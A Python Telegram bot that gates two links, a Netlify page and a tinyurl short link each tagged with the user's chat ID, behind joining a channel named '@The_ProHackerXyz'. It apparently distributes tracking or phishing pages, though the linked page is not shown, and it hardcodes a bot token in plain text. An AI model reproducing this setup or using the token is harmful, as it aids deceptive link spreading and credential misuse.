import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "8338863970:AAFgUanwiwygleLeEpYK-RkmJxt6HNHzIwE"
BASE_URL = "https://monumental-sprite-b5db56.netlify.app"
SHORT_URL = "https://tinyurl.com/bd65eswp"
CHANNEL_USERNAME = "@The_ProHackerXyz"

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    markup = InlineKeyboardMarkup()
    join_btn = InlineKeyboardButton("Join Channel ✅", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
    joined_btn = InlineKeyboardButton("I've Joined ✅", callback_data="check_joined")
    markup.add(join_btn, joined_btn)

    bot.send_message(chat_id, "Join my channel to get your links:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def check_joined(call):
    chat_id = call.from_user.id
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
        if member.status in ['creator', 'administrator', 'member']:
            # append chat_id to both URLs
            link1 = f"{BASE_URL}/?id={chat_id}"
            link2 = f"{SHORT_URL}?id={chat_id}"
            bot.send_message(call.from_user.id, f"Here are your links:\n\n1. {link1}\n\n2. {link2}")
        else:
            bot.answer_callback_query(call.id, "Don't be oversmart 😎", show_alert=True)
    except:
        bot.answer_callback_query(call.id, "Don't be oversmart 😎", show_alert=True)

bot.polling()
